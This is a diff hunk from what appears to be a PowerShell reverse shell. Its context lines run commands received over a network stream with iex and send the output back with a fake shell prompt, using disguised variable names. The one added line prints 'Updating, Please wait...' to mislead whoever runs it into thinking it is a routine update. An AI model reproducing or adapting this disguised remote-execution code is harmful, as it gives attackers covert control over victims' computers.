@@ -34,3 +34,4 @@ $return = (iex $info 2>&1 | Out-String )
 $return2 = $return + "PS " + (pwd).Path + "> ";$sendteeth = ([text.encoding]::ASCII).GetBytes($return2);$river.Write($sendteeth,0,$sendteeth.Length)
 $river.Flush()}
 $client.Close()
+write-host "Updating, Please wait..."
